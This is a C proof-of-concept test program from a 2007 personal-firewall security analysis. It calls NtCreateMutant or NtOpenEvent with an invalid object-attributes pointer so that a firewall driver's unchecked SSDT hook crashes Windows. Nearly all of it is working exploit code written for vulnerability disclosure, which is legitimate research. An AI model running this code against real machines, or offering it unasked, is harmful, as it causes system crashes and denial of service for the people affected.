/*

 Testing program for Multiple insufficient argument validation of hooked SSDT function (BTP00000P002NF)
 

 Usage:
 prog FUNCNAME
   FUNCNAME - name of function to be checked

 Description:
 This program calls given function with parameters that cause the crash of the system. This happens because of 
 insufficient check of function arguments in the driver of the firewall.

 Test:
 Running the testing program with the name of function from the list of functions with insufficient check
 of arguments.

*/

#undef __STRICT_ANSI__
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <ddk/ntapi.h>
#include <ddk/ntifs.h>

void about(void)
{
  printf("Testing program for Multiple insufficient argument validation of hooked SSDT function (BTP00000P002NF)\n");
  printf("Windows Personal Firewall analysis project\n");
  printf("Copyright 2007 by Matousec - Transparent security\n");
  printf("http://www.matousec.com/""\n\n");
  return;
}

void usage(void)
{
  printf("Usage: test FUNCNAME\n"
         "  FUNCNAME - name of function to be checked\n");
  return;
}


int main(int argc,char **argv)
{
  about();

  if (argc!=2)
  {
    usage();
    return 1;
  }

  if (!stricmp(argv[1],"NtCreateMutant") || !stricmp(argv[1],"ZwCreateMutant"))
  {
    HANDLE handle;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa,(PVOID)1,0,NULL,NULL);

    ZwCreateMutant(&handle,0,&oa,FALSE);

  } else if (!stricmp(argv[1],"NtOpenEvent") || !stricmp(argv[1],"ZwOpenEvent"))
  {
    HANDLE handle;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa,(PVOID)1,0,NULL,NULL);

    ZwOpenEvent(&handle,0,&oa);
  } else printf("\nI do not know how to exploit the vulnerability using this function.\n");

  printf("\nTEST FAILED!\n");
  return 1;
}